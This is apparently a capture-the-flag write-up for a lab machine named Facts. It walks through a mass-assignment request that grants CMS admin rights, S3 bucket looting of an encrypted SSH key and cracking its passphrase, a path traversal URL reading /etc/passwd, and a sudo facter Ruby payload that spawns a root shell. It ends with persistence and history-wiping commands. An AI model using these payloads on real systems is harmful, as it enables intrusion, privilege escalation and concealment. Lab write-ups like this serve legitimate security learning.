+++
date = '2026-07-24T02:57:45+02:00'
draft = false
title = 'Facts Writeup EN'
+++
**Author**: **`joy.scd01`**

**Date**: **`24/07/2026`**

![Facts.jpeg](/images/imgs_facts/Facts.jpeg)

---
# Introduction

**_Facts_**  is the first machine released during **Season 10** (**Underground**).

Initial enumeration leads to a **Camaleon CMS** instance, where a **Mass Assignment** vulnerability allows us to escalate a newly registered user to an administrator role. From the admin panel, exposed **AWS S3** configurations allow us to interact with a local bucket and steal an encrypted **SSH key**.
After cracking the key, a **Path Traversal** vulnerability is needed to disclose the **`/etc/passwd`** file and find the correct username. Finally, the privilege escalation relies on a **Sudo** misconfiguration involving the **facter** binary.

---
# Techniques Used

- **Camaleon CMS Mass Assignment (CVE-2025-2304)**

- **AWS S3 Bucket Pentesting**

- **Hash Cracking**

- **Path Traversal → Information Disclosure (CVE-2026-1776)**

- **Sudo Misconfiguration → Privilege Escalation**

# Enumeration

## nmap

Initial scan on all ports:

```bash
PORT      STATE SERVICE REASON
22/tcp    open  ssh     syn-ack ttl 63
80/tcp    open  http    syn-ack ttl 63
54321/tcp open  unknown syn-ack ttl 62
```

Targeted scan with scripts and service detection:

```bash
PORT   STATE SERVICE REASON         VERSION
22/tcp open  ssh     syn-ack ttl 63 OpenSSH 9.9p1 Ubuntu 3ubuntu3.2 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   256 4d:d7:b2:8c:d4:df:57:9c:a4:2f:df:c6:e3:01:29:89 (ECDSA)
|   256 a3:ad:6b:2f:4a:bf:6f:48:ac:81:b9:45:3f:de:fb:87 (ED25519)
80/tcp open  http    syn-ack ttl 63 nginx 1.26.3 (Ubuntu)
|_http-title: Did not follow redirect to http://facts.htb/
|_http-server-header: nginx/1.26.3 (Ubuntu)
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel
```

**Open ports**:

- **22**/tcp - SSH

- **80**/tcp - HTTP

- **54321**/tcp - AWS S3 Endpoint (identified later)

# HTTP - Web Enumeration

Using **gobuster**, I found an administration panel hosted on **`/admin`**. The application running was identified as **Camaleon CMS version 2.9.0**.

![gobuster.png](/images/imgs_facts/gobuster.png)

![camaleon_cms_version.png](/images/imgs_facts/camaleon_cms_version.png)

By researching this specific version, I discovered it is vulnerable to **CVE-2025-2304**, a PrivEsc flaw caused by a **Mass Assignment** vulnerability.

**Note**: _When a user wishes to change his password, the **`updated_ajax`** method of the **`UsersController`** is called. The vulnerability stems from the use of the dangerous **`permit!`** method, which allows all parameters to pass through without any filtering._

I registered a new standard user and intercepted the profile update request using **Burp Suite**.

![registered.png](/images/imgs_facts/registered.png)

By simply adding **`&user[role]=admin`** to the **POST** data, I successfully granted my user administrative privileges.

**Malicious POST Request**:

```text
POST /admin/users/5 HTTP/1.1
Host: facts.htb
Content-Length: 278
Content-Type: application/x-www-form-urlencoded
Cookie: [redacted]
_method=patch&authenticity_token=[redacted]&meta%5Bavatar%5D=&user%5Busername%5D=fall&user%5Bemail%5D=fall%40star.ss&user%5Bfirst_name%5D=fall&user%5Blast_name%5D=star&meta%5Bslogan%5D=&user[role]=admin 
```

![privesc_web.png](/images/imgs_facts/privesc_web.png)

---
# Initial Access | AWS Enumeration & Hash Cracking

Once logged in as an **administrator**, exploring the **CMS** settings revealed an internal **AWS S3 bucket** endpoint pointing to port **54321**.

![aws_s3.png](/images/imgs_facts/aws_s3.png)

Since I didn't have much prior experience with **Cloud Security** and **AWS** infrastructure, I took a moment to research how **S3 buckets** operate and how to interact with custom endpoints. After reading up on some cloud pentesting methodologies and familiarizing myself with the tool, I quickly configured my **AWS CLI** profile:

```bash
aws configure --profile facts
```

![aws_configure.png](/images/imgs_facts/aws_configure.png)

And proceeded to enumerate the bucket:

```bash
aws s3 ls s3:// --endpoint-url http://facts.htb:54321
aws s3 ls s3://internal/.ssh/ --endpoint-url http://facts.htb:54321
```

![aws_enum.png](/images/imgs_facts/aws_enum.png)

I found an **SSH key** and downloaded it to my machine:

```bash
aws s3 cp s3://internal/.ssh/id_ed25519 --endpoint-url http://facts.htb:54321 .
```

![encrypted_rsa.png](/images/imgs_facts/encrypted_rsa.png)

The downloaded **`id_ed25519`** key was encrypted. I converted it to a format digestible by **John the Ripper** and cracked it:

```bash
ssh2john id_ed25519 > key
john key --wordlist=/usr/share/wordlists/rockyou.txt
```

![hash_cracked.png](/images/imgs_facts/hash_cracked.png)

**Password found**: **`dragonballz`**

At this point, I had a valid **SSH key** and its **passphrase**, but I was stuck: I couldn't find any valid usernames to log in. I tried combinations of names found on the web page (**bob**, **carol**, **dave**) and further **aws-cli** enumeration, but nothing worked.

![ssh_fails.png](/images/imgs_facts/ssh_fails.png)

## User Enumeration | Path Traversal (CVE-2026-1776)

After hours of thorough enumeration, I discovered a potential **Path Traversal** vulnerability in the **`/download_private_file`** method of **Camaleon CMS**.

- **https://www.sentinelone.com/vulnerability-database/cve-2026-1776/**

**Note**: _It was quite frustrating to find because I assumed this vulnerability was already patched in version **2.9.0**. However, upon reviewing the security advisories and the repository's commit history lately, I realized that the vulnerability remained exploitable up until a specific later commit. This meant the exact build running on the target was still vulnerable despite its base version number._

.

![wojak.jpg](/images/imgs_facts/wojak.jpg)

I used the vulnerability to read the **`/etc/passwd`** file:

```text
http://facts.htb/admin/media/download_private_file?file=../../../../../../etc/passwd
```

![etcpasswd.png](/images/imgs_facts/etcpasswd.png)

I successfully logged in via **SSH** as the user **trivia**:

```bash
ssh -i id_ed25519 trivia@facts.htb
```

![initial_access.png](/images/imgs_facts/initial_access.png)

I grabbed the **user flag** located in **`/home/william/`**.

![userflag.png](/images/imgs_facts/userflag.png)

---
# Privilege Escalation | Sudo misconfiguration → root

As always, the first check after gaining shell access through a valid password was **`sudo -l`**:

```bash
trivia@facts:~$ sudo -l
```

![sudol.png](/images/imgs_facts/sudol.png)

The user **trivia** was allowed to run **`/usr/bin/facter`** as **root** without a password.
A quick search on **GTFOBins** revealed that **facter** has a **`--custom-dir`** flag, which executes the first **`.rb`** file found in the specified path.

Having never written a single line of **Ruby** before, I knew what I needed to do (execute a system command), but I didn't know how to write it. I quickly skimmed the official Puppet documentation to understand how custom facts are structured, and leveraged an **AI** assistant to help me draft the exact syntax needed to spawn a bash shell within the **`Facter.add`** block.

I crafted the following malicious **Ruby** payload in **`/tmp/exploit.rb`**:

```Ruby
Facter.add(:staaars) do
  setcode do
    system("/bin/bash")
  end
end
```

Then, I executed the binary pointing to my custom directory:

```bash
sudo /usr/bin/facter --custom-dir /tmp
```

This instantly spawned a **root** shell, allowing me to read the **root flag** in **`/root/`**.

![privesc_rootflag.png](/images/imgs_facts/privesc_rootflag.png)

---
# Post Exploitation & House Cleaning

To ensure persistent access during the rest of the assessment, I added my public **RSA key** to **`/root/.ssh/authorized_keys`**.

Before concluding the pentest, I performed the following house cleaning actions to restore the machine to its original state:

```bash
rm /tmp/*.rb
rm /root/.ssh/authorized_keys && mv authorized_keys.bak authorized_keys
echo '' > /home/trivia/.bash_history
echo '' > /root/.bash_history
```

---
# Final Thoughts

This was a really fun and modern machine, except for the frustrating path traversal phase.

The initial foothold perfectly highlights the real-world danger of **Mass Assignment** vulnerabilities in modern web frameworks. Finding the **AWS** credentials and cracking the **SSH key** gave a false sense of immediate victory, only to force me back to dig deeper into the **CMS** and uncover the **Path Traversal** required for proper user enumeration.

While the privilege escalation was relatively standard, it served as a great reminder to always check **GTFOBins** for obscure binary flags that allow arbitrary code execution, and proved how valuable **AI** can be as a co-pilot to quickly bridge syntax gaps when dealing with unfamiliar languages like **Ruby**.

**Sources**:

- **Camaleon CMS Mass Assignment (CVE-2025-2304) | https://www.tenable.com/security/research/tra-2025-09**

- **Camaleon CMS Path Traversal (CVE-2026-1776) | https://www.sentinelone.com/vulnerability-database/cve-2026-1776/**

- **GTFOBins (facter) | https://gtfobins.org/gtfobins/facter/**

- **Facter Shell Execution Documentation | https://help.puppet.com/core/current/Content/PuppetCore/executing_shell_commands_in_facts.htm**